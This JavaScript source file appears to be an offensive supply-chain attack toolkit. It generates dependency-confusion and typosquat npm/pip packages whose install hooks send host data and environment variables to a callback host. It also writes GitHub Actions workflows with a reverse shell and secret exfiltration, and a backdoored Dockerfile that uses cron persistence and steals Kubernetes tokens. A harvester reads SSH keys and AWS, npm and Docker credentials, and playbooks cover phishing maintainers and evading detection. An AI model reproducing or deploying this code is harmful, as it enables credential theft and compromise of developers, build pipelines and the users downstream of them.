function generateDepConfusionPayload(name, eco, callbackHost, outDir) {
  const [host, port] = callbackHost.split(':');
  const dir = join(outDir, 'dep-confusion');
  mkdirSync(dir, { recursive: true });

  if (eco === 'npm') {
    const pkg = {
      name,
      version: '99.99.99',
      description: 'Internal package — automated build artifact',
      scripts: {
        preinstall: `node -e "const{execSync:e}=require('child_process');try{e('curl ${host}:${port}/?h='+require('os').hostname()+'&u='+require('os').userInfo().username+'&d='+process.cwd()+' || wget -q -O- ${host}:${port}/?h='+require('os').hostname())}catch(x){}"`,
      },
      main: 'index.js',
    };
    writeFileSync(join(dir, 'package.json'), JSON.stringify(pkg, null, 2));
    writeFileSync(join(dir, 'index.js'), `// Legitimate-looking stub\nmodule.exports = {};\n`);
    writeFileSync(join(dir, 'README.md'), `# ${name}\nInternal package.\n`);
    writeFileSync(join(dir, 'DEPLOY.sh'), `#!/bin/bash\n# Deploy dependency confusion payload\ncd ${dir}\nnpm publish --access=public\necho "[+] Published ${name}@99.99.99 to npm"\necho "[+] Start listener: nc -lvnp ${port}"\n`);
  } else if (eco === 'pip') {
    const setupPy = `from setuptools import setup
from setuptools.command.install import install
import os, socket, subprocess

class PostInstall(install):
    def run(self):
        install.run(self)
        try:
            h = socket.gethostname()
            u = os.environ.get('USER', 'unknown')
            d = os.getcwd()
            subprocess.Popen(['curl', f'${host}:${port}/?h={h}&u={u}&d={d}'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass

setup(
    name='${name}',
    version='99.99.99',
    description='Internal package',
    py_modules=['${name.replace(/-/g, '_')}'],
    cmdclass={'install': PostInstall},
)`;
    writeFileSync(join(dir, 'setup.py'), setupPy);
    writeFileSync(join(dir, `${name.replace(/-/g, '_')}.py`), `# Stub module\n`);
    writeFileSync(join(dir, 'DEPLOY.sh'), `#!/bin/bash\ncd ${dir}\npython setup.py sdist bdist_wheel\ntwine upload dist/*\necho "[+] Published ${name} v99.99.99 to PyPI"\n`);
  }

  return {
    success: true,
    attack_type: 'dependency_confusion',
    package_name: name,
    version: '99.99.99',
    ecosystem: eco,
    callback: callbackHost,
    output_dir: dir,
    files: readdirSync(dir),
    instructions: [
      `1. Start listener: nc -lvnp ${port}`,
      `2. Review payload in ${dir}`,
      `3. Publish: ${eco === 'npm' ? 'npm publish --access=public' : 'twine upload dist/*'}`,
      `4. Wait for target build system to install v99.99.99`,
      `5. Receive callback with hostname, user, cwd`,
    ],
    mitre_technique: 'T1195.001',
  };
}

function generateTyposquatPayload(name, eco, callbackHost, outDir) {
  const [host, port] = callbackHost.split(':');
  const dir = join(outDir, 'typosquat');
  mkdirSync(dir, { recursive: true });

  // Generate typosquat variants
  const variants = generateTyposquatNames(name);

  if (eco === 'npm') {
    for (const variant of variants.slice(0, 3)) {
      const vDir = join(dir, variant);
      mkdirSync(vDir, { recursive: true });
      const pkg = {
        name: variant,
        version: '1.0.0',
        description: `Lightweight ${name} alternative`,
        scripts: {
          postinstall: `node -e "require('https').get('http://${host}:${port}/t?pkg=${variant}&h='+require('os').hostname()+'&env='+Buffer.from(JSON.stringify(process.env)).toString('base64').slice(0,500))"`,
        },
        main: 'index.js',
      };
      writeFileSync(join(vDir, 'package.json'), JSON.stringify(pkg, null, 2));
      writeFileSync(join(vDir, 'index.js'), `// Proxy to the real package\ntry { module.exports = require('${name}'); } catch { module.exports = {}; }\n`);
    }
  } else if (eco === 'pip') {
    for (const variant of variants.slice(0, 3)) {
      const vDir = join(dir, variant);
      mkdirSync(vDir, { recursive: true });
      const setupPy = `from setuptools import setup
from setuptools.command.install import install
import os, subprocess, json, base64

class Exfil(install):
    def run(self):
        install.run(self)
        try:
            env = base64.b64encode(json.dumps(dict(os.environ)).encode())[:500].decode()
            subprocess.Popen(['curl', f'http://${host}:${port}/t?pkg=${variant}&env={env}'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass

setup(name='${variant}', version='1.0.0', description='${name} utils', py_modules=['main'], cmdclass={'install': Exfil})`;
      writeFileSync(join(vDir, 'setup.py'), setupPy);
      writeFileSync(join(vDir, 'main.py'), `# Proxy to real package\ntry:\n    from ${name.replace(/-/g, '_')} import *\nexcept: pass\n`);
    }
  }

  return {
    success: true,
    attack_type: 'typosquatting',
    original_package: name,
    typosquat_variants: variants,
    ecosystem: eco,
    callback: callbackHost,
    output_dir: dir,
    instructions: [
      `1. Start listener: nc -lvnp ${port}`,
      `2. Review generated variants: ${variants.join(', ')}`,
      `3. Publish each variant to ${eco === 'npm' ? 'npmjs.com' : 'PyPI'}`,
      `4. Variants exfiltrate environment variables on install`,
      `5. The package proxies to the real "${name}" so functionality is preserved`,
    ],
    mitre_technique: 'T1195.001',
  };
}

function generateTyposquatNames(name) {
  const variants = new Set();
  const lower = name.toLowerCase();

  // Character swap (adjacent)
  for (let i = 0; i < lower.length - 1; i++) {
    const arr = lower.split('');
    [arr[i], arr[i + 1]] = [arr[i + 1], arr[i]];
    variants.add(arr.join(''));
  }
  // Character duplication
  for (let i = 0; i < lower.length; i++) {
    variants.add(lower.slice(0, i) + lower[i] + lower.slice(i));
  }
  // Character omission
  for (let i = 0; i < lower.length; i++) {
    variants.add(lower.slice(0, i) + lower.slice(i + 1));
  }
  // Hyphen/underscore swap
  if (lower.includes('-')) variants.add(lower.replace(/-/g, '_'));
  if (lower.includes('_')) variants.add(lower.replace(/_/g, '-'));
  // Add/remove hyphen
  variants.add(lower.replace(/([a-z])([a-z])/g, (_, a, b) => a + '-' + b).slice(0, lower.length + 1));

  variants.delete(lower);
  return [...variants].slice(0, 10);
}

function generateCICDExploit(target, callbackHost, outDir) {
  const [host, port] = callbackHost.split(':');
  const dir = join(outDir, 'cicd-exploit');
  mkdirSync(dir, { recursive: true });

  // GitHub Actions exploit — pull_request_target with checkout
  const prTargetExploit = `# Malicious workflow that exploits pull_request_target
# This runs in the context of the BASE repo with secrets access
name: "Build Verification"
on:
  pull_request_target:
    types: [opened, synchronize]

permissions:
  contents: write
  
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}
      - name: Build
        run: |
          # This executes attacker-controlled code with repo secrets
          make build
        env:
          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}
`;

  // Reverse shell via GitHub Actions
  const reverseShellAction = `name: "CI Build"
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Setup
        run: |
          bash -i >& /dev/tcp/${host}/${port} 0>&1 &
          # Exfiltrate all secrets
          env | base64 | curl -X POST -d @- http://${host}:${port}/secrets
`;

  // Poisoned GitHub Action
  const maliciousAction = `name: 'Build Helper'
description: 'Optimized build caching action'
inputs:
  cache-key:
    description: 'Cache key'
    required: false
runs:
  using: 'composite'
  steps:
    - shell: bash
      run: |
        # Exfiltrate GITHUB_TOKEN and all secrets
        curl -s -X POST http://${host}:${port}/exfil \\
          -H "Content-Type: application/json" \\
          -d "{\\"token\\":\\"$GITHUB_TOKEN\\",\\"repo\\":\\"$GITHUB_REPOSITORY\\",\\"env\\":\\"$(env | base64)\\"}"
`;

  writeFileSync(join(dir, 'exploit-pr-target.yml'), prTargetExploit);
  writeFileSync(join(dir, 'reverse-shell-workflow.yml'), reverseShellAction);
  writeFileSync(join(dir, 'malicious-action.yml'), maliciousAction);
  writeFileSync(join(dir, 'PLAYBOOK.md'), `# CI/CD Supply Chain Exploit Playbook

## Attack 1: pull_request_target Exploit
1. Fork the target repository
2. Add \`exploit-pr-target.yml\` to \`.github/workflows/\`
3. Modify any source file to include your payload in Makefile/build script
4. Submit a PR — the workflow runs with the BASE repo's secrets

## Attack 2: Reverse Shell via Workflow
1. If you have write access, add \`reverse-shell-workflow.yml\`
2. Start listener: \`nc -lvnp ${port}\`
3. Push any commit — you get a shell on the runner with all secrets

## Attack 3: Malicious Action Injection
1. Publish \`malicious-action.yml\` as a GitHub Action
2. Target developers add it with \`uses: your-org/build-helper@main\`
3. Steals GITHUB_TOKEN and environment variables
`);

  return {
    success: true,
    attack_type: 'cicd_exploit',
    target,
    callback: callbackHost,
    output_dir: dir,
    files: readdirSync(dir),
    exploits: ['pull_request_target hijack', 'Reverse shell workflow', 'Malicious GitHub Action'],
    instructions: [
      `1. Start listener: nc -lvnp ${port}`,
      `2. Choose exploit from ${dir}`,
      `3. Read PLAYBOOK.md for step-by-step instructions`,
      `4. Stolen secrets will be exfiltrated to ${callbackHost}`,
    ],
    mitre_techniques: ['T1195.002', 'T1059.004'],
  };
}

function generateContainerPoison(target, callbackHost, outDir) {
  const [host, port] = callbackHost.split(':');
  const dir = join(outDir, 'container-poison');
  mkdirSync(dir, { recursive: true });

  const dockerfile = `FROM ${target}

# Injected supply chain backdoor — layer looks legitimate
RUN apt-get update -qq && apt-get install -y -qq curl netcat-openbsd > /dev/null 2>&1 || true
COPY backdoor.sh /usr/local/bin/.health-check
RUN chmod +x /usr/local/bin/.health-check

# Add persistence via cron
RUN echo "*/5 * * * * /usr/local/bin/.health-check" >> /var/spool/cron/crontabs/root 2>/dev/null || \\
    echo "*/5 * * * * /usr/local/bin/.health-check" >> /etc/crontabs/root 2>/dev/null || true

# Keep original entrypoint
`;

  const backdoor = `#!/bin/bash
# Disguised as health check
(bash -i >& /dev/tcp/${host}/${port} 0>&1 &) 2>/dev/null
# Exfiltrate k8s secrets and env
curl -s -X POST http://${host}:${port}/container \\
  -d "host=$(hostname)&env=$(env | base64)&k8s_token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)" \\
  2>/dev/null &
`;

  writeFileSync(join(dir, 'Dockerfile'), dockerfile);
  writeFileSync(join(dir, 'backdoor.sh'), backdoor);
  writeFileSync(join(dir, 'build.sh'), `#!/bin/bash\ncd ${dir}\ndocker build -t ${target} .\necho "[+] Trojanized image built as ${target}"\necho "[+] Push: docker push ${target}"\n`);

  return {
    success: true,
    attack_type: 'container_poison',
    base_image: target,
    callback: callbackHost,
    output_dir: dir,
    files: readdirSync(dir),
    instructions: [
      `1. Build: docker build -t ${target} ${dir}`,
      `2. Push to registry matching target's FROM directive`,
      `3. Start listener: nc -lvnp ${port}`,
      `4. When target rebuilds, backdoor executes`,
      `5. Receives env vars, k8s tokens, reverse shell`,
    ],
    mitre_technique: 'T1195.003',
  };
}

function generateCredHarvester(name, eco, callbackHost, outDir) {
  const [host, port] = callbackHost.split(':');
  const dir = join(outDir, 'cred-harvest');
  mkdirSync(dir, { recursive: true });

  const harvesterNode = `// Credential harvester — runs on install
const https = require('https');
const os = require('os');
const fs = require('fs');
const { execSync } = require('child_process');

function harvest() {
  const data = {
    hostname: os.hostname(),
    user: os.userInfo(),
    env: process.env,
    cwd: process.cwd(),
    ssh_keys: [],
    aws_creds: null,
    git_config: null,
    npm_token: null,
    docker_config: null,
  };

  // SSH keys
  try {
    const sshDir = require('path').join(os.homedir(), '.ssh');
    for (const f of fs.readdirSync(sshDir)) {
      if (!f.endsWith('.pub')) data.ssh_keys.push({ file: f, content: fs.readFileSync(require('path').join(sshDir, f), 'utf-8').slice(0, 500) });
    }
  } catch {}

  // AWS credentials
  try { data.aws_creds = fs.readFileSync(require('path').join(os.homedir(), '.aws', 'credentials'), 'utf-8'); } catch {}

  // Git config
  try { data.git_config = fs.readFileSync(require('path').join(os.homedir(), '.gitconfig'), 'utf-8'); } catch {}

  // npm token
  try { data.npm_token = fs.readFileSync(require('path').join(os.homedir(), '.npmrc'), 'utf-8'); } catch {}

  // Docker config
  try { data.docker_config = fs.readFileSync(require('path').join(os.homedir(), '.docker', 'config.json'), 'utf-8'); } catch {}

  // Browser cookies / saved passwords paths
  try { data.chrome_profile = fs.existsSync(require('path').join(os.homedir(), '.config', 'google-chrome')); } catch {}

  // Send exfiltrated data
  const postData = JSON.stringify(data);
  const req = https.request({ hostname: '${host}', port: ${port}, path: '/harvest', method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': postData.length },
    rejectUnauthorized: false }, () => {});
  req.on('error', () => {});
  req.write(postData);
  req.end();
}

harvest();
`;

  writeFileSync(join(dir, 'harvester.js'), harvesterNode);

  if (eco === 'npm') {
    const pkg = { name, version: '1.0.0', scripts: { postinstall: 'node harvester.js' }, main: 'index.js' };
    writeFileSync(join(dir, 'package.json'), JSON.stringify(pkg, null, 2));
    writeFileSync(join(dir, 'index.js'), `module.exports = {};\n`);
  }

  return {
    success: true,
    attack_type: 'credential_harvest',
    package_name: name,
    ecosystem: eco,
    callback: callbackHost,
    output_dir: dir,
    files: readdirSync(dir),
    harvests: ['SSH private keys', 'AWS credentials', 'Git config', 'npm tokens', 'Docker configs', 'Environment variables', 'System info'],
    instructions: [
      `1. Start HTTPS listener on ${callbackHost}`,
      `2. Publish package to ${eco} registry`,
      `3. Credentials exfiltrated on package install`,
      `4. Data sent as JSON to https://${callbackHost}/harvest`,
    ],
    mitre_techniques: ['T1552.001', 'T1552.004', 'T1003'],
  };
}

function generateMaliciousUpdate(name, eco, callbackHost, outDir) {
  const [host, port] = callbackHost.split(':');
  const dir = join(outDir, 'malicious-update');
  mkdirSync(dir, { recursive: true });

  writeFileSync(join(dir, 'STRATEGY.md'), `# Malicious Update Attack — ${name}
## Event-Stream Style Attack

### Prerequisites:
- Gain maintainer access to "${name}" on ${eco}
  - Method 1: Social engineering current maintainer
  - Method 2: Offer to help maintain abandoned package
  - Method 3: Compromise maintainer's account (credential stuffing, phishing)

### Execution:
1. Push several legitimate updates to build trust
2. In a minor version bump, add obfuscated backdoor
3. The backdoor activates only on specific conditions (targeted org, specific env vars)
4. Exfiltrate data to ${callbackHost}

### Backdoor Patterns:
- Conditional execution: only triggers in CI/CD environments
- Delayed execution: waits 24-48h after install before activating
- Targeted: checks hostname/env for specific company indicators
- Obfuscated: payload encoded in base64 or hex within comments/data files

### Persistence:
- Package is already in dependency trees of thousands of projects
- Automatic updates via semver ranges (^1.0.0) pull the malicious version
- Most orgs don't audit transitive dependency updates
`);

  return {
    success: true,
    attack_type: 'malicious_update',
    target_package: name,
    ecosystem: eco,
    output_dir: dir,
    files: readdirSync(dir),
    instructions: [
      '1. Gain maintainer access to the target package',
      '2. Build trust with legitimate contributions',
      '3. Inject obfuscated backdoor in a minor version update',
      '4. Backdoor activates conditionally to avoid detection',
    ],
    mitre_technique: 'T1195.002',
  };
}

function generateBuildCachePoison(name, eco, callbackHost, outDir) {
  const [host, port] = callbackHost.split(':');
  const dir = join(outDir, 'cache-poison');
  mkdirSync(dir, { recursive: true });

  writeFileSync(join(dir, 'STRATEGY.md'), `# Build Cache Poisoning — ${name} (${eco})

## Attack Vector:
Poison the build/package cache to inject malicious artifacts that get used in subsequent builds.

## npm Cache Poisoning:
\`\`\`bash
# Find npm cache location
npm cache ls | head -20
# Inject modified tarball into cache
npm cache add ./modified-${name}-1.0.0.tgz
\`\`\`

## pip Cache Poisoning:
\`\`\`bash
# Poison pip cache (~/.cache/pip)
pip download ${name} --no-deps -d /tmp/cache
# Replace wheel with backdoored version
pip cache purge && pip install ./backdoored-${name}.whl
\`\`\`

## CI/CD Cache Poisoning:
- GitHub Actions: Exploit actions/cache to inject poisoned dependencies
- GitLab CI: Modify shared cache directories between jobs
- Jenkins: Poison the shared workspace/node_modules

## Detection Evasion:
- Match original package hash length
- Keep package size similar
- Preserve all legitimate functionality
- Only add minimal backdoor code
`);

  return {
    success: true,
    attack_type: 'build_cache_poison',
    target_package: name,
    ecosystem: eco,
    output_dir: dir,
    files: readdirSync(dir),
    mitre_technique: 'T1195.002',
  };
}

